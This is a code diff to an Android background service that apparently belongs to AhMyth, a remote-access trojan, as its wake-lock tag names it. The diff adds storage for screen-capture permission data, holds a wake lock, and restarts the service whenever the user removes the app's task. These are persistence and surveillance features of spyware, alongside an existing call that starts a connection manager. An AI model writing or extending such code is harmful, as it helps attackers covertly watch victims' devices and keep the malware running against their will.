@@ -8,13 +8,31 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
 import android.os.IBinder;
+import android.os.PowerManager;
 
 import androidx.core.app.NotificationCompat;
+import androidx.core.content.ContextCompat;
 
 public class MainService extends Service {
 
     public static final String CHANNEL_ID = BuildConfig.APPLICATION_ID;
     private static Context contextOfApplication;
+    private static int screenResultCode;
+    private static Intent screenData;
+    private PowerManager.WakeLock wakeLock;
+
+    public static void setScreenCaptureData(int resultCode, Intent data) {
+        screenResultCode = resultCode;
+        screenData = data;
+    }
+
+    public static int getScreenResultCode() {
+        return screenResultCode;
+    }
+
+    public static Intent getScreenData() {
+        return screenData;
+    }
 
     @Override
     public IBinder onBind(Intent intent) {
@@ -36,15 +54,35 @@ public class MainService extends Service {
                 .build();
         startForeground(1, notification);
 
+        acquireWakeLock();
+
         contextOfApplication = this;
         ConnectionManager.startAsync(this);
 
         return Service.START_STICKY;
     }
 
+    private void acquireWakeLock() {
+        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
+        if (powerManager != null) {
+            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AhMyth::MainServiceWakeLock");
+            wakeLock.acquire(10 * 60 * 1000L /*10 minutes*/);
+        }
+    }
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
+        restartServiceIntent.setPackage(getPackageName());
+        startService(restartServiceIntent);
+        super.onTaskRemoved(rootIntent);
+    }
 
     @Override
     public void onDestroy() {
+        if (wakeLock != null && wakeLock.isHeld()) {
+            wakeLock.release();
+        }
         super.onDestroy();
     }
 
